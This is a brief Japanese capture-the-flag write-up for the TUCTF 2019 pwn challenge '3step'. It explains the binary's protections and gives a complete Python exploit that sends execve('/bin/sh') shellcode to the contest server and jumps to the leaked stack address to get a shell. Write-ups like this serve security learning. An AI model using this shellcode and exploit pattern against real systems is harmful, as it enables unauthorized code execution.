# [pwn 490pts] 3step - TUCTF 2019
またNXが無効です。シェルコード大好きか？
```
$ checksec -f 3step
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX disabled   PIE enabled     No RPATH   No RUNPATH   75 Symbols     Yes      0               4       3step
```
グローバル変数とスタックのアドレスが渡されます。それぞれに少ないデータを書き込めます。最後に指定したアドレスをcallしてくれるので、スタックに飛んでシェルコードを実行しました。
```python
from ptrlib import *
import time

#sock = Process("./3step")
sock = Socket("chal.tuctf.com", 30504)

time.sleep(1)
sock.recvline()
sock.recvline()
addr_buf1 = int(sock.recvline(), 16)
addr_stack = int(sock.recvline(), 16)
sock.sendafter(": ", "/bin/sh\x00")
sock.sendafter(": ", b"\x31\xC9\x31\xD2\xBB" + p32(addr_buf1) + b"\xB8\x0B\x00\x00\x00\xCD\x80")
sock.sendafter(": ", p32(addr_stack))

sock.interactive()
```

# 感想
簡単ですね。